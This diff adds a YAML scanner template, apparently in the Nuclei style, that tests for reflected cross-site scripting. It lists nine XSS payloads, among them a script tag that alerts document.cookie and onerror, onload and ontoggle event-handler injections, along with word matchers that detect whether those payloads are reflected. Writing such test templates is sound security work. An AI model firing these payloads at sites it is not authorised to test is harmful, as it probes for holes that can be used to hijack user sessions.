@@ -1,0 +1,65 @@
+id: generic-xss-reflected
+info:
+  name: Reflected XSS
+  severity: high
+  description: Generic reflected cross-site scripting testing
+  tags:
+    - xss
+    - reflected
+    - generic
+
+generic:
+  endpoint: "{{xss_reflected}}"
+
+  method: GET
+
+  parameter: "input"
+
+  payloads:
+    - name: "script_alert"
+      value: "<script>alert(document.cookie)</script>"
+      description: "Basic script tag"
+
+    - name: "img_onerror"
+      value: "<img src=x onerror=alert(1)>"
+      description: "IMG onerror event"
+
+    - name: "svg_onload"
+      value: "<svg onload=alert(1)>"
+      description: "SVG onload event"
+
+    - name: "body_onload"
+      value: "<body onload=alert(1)>"
+      description: "BODY onload event"
+
+    - name: "iframe_onload"
+      value: "<iframe onload=alert(1)>"
+      description: "IFRAME onload event"
+
+    - name: "input_onfocus"
+      value: "<input onfocus=alert(1) autofocus>"
+      description: "INPUT onfocus with autofocus"
+
+    - name: "details_open"
+      value: "<details open ontoggle=alert(1)>"
+      description: "DETAILS ontoggle event"
+
+    - name: "marquee_onstart"
+      value: "<marquee onstart=alert(1)>"
+      description: "MARQUEE onstart event"
+
+    - name: "video_poster"
+      value: "<video poster=javascript:alert(1)>"
+      description: "VIDEO poster javascript"
+
+  matchers:
+    - type: word
+      words:
+        - "<script>alert("
+        - "<img src=x onerror="
+        - "<svg onload="
+        - "<body onload="
+        - "<iframe onload="
+        - "<input onfocus="
+        - "<details open ontoggle="
+      condition: or
